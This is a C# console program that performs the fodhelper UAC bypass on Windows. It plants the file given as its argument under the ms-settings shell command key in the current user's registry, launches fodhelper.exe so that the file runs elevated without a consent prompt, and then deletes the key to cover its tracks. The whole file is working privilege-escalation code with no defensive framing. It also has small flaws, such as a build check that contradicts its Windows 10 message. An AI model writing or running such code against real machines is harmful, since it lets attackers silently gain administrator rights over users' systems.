﻿using Microsoft.Win32;
using System;
using System.Diagnostics;
using System.IO;
using System.Security.Principal;

namespace TestUAC
{
    class Program
    {
        static void Main(string[] args)
        {
            if (Environment.OSVersion.Version.Build < 9200)
            {
                Console.WriteLine("This program requires NT 10.0 (Windows 10) or higher!");
                return;
            }



            string fileName = args[0];
            if (!File.Exists(fileName))
            {
                Console.WriteLine("The file {arg} specified in the argument is not valid");
                return;
            }

            Console.WriteLine("Starting UAC bypass!");
            WindowsPrincipal pricipal = new WindowsPrincipal(WindowsIdentity.GetCurrent());
            bool hasAdministrativeRight = pricipal.IsInRole(WindowsBuiltInRole.Administrator);
            if (!hasAdministrativeRight)
            {
                try
                {
                    RegistryKey rk;
                    Console.WriteLine($"Setting value {fileName}!");
                    rk = Registry.CurrentUser.CreateSubKey(@"SOFTWARE\Classes\ms-settings\shell\open\command");
                    rk.SetValue("", fileName, RegistryValueKind.String);
                    rk.SetValue("DelegateExecute", "", RegistryValueKind.String);
                    Console.WriteLine($"Executing fodhelper!");
                    Process.Start(@"C:\Windows\System32\fodhelper.exe").WaitForExit();
                    rk.Close();
                    rk = Registry.CurrentUser.CreateSubKey(@"SOFTWARE\Classes");
                    rk.DeleteSubKeyTree("ms-settings");
                    rk.Close();
                    Environment.Exit(0);
                }
                catch (Exception ex)
                {

                    Console.WriteLine("An exception occured: " + ex.Message);
                    RegistryKey rk = Registry.CurrentUser.CreateSubKey(@"SOFTWARE\Classes");
                    rk.DeleteSubKeyTree("ms-settings");
                    rk.Close();
                    Environment.Exit(-1);
                }
            }

            Console.WriteLine($"UAC Bypassed and ran {fileName}!");
            Environment.Exit(-1);
        }
    }
}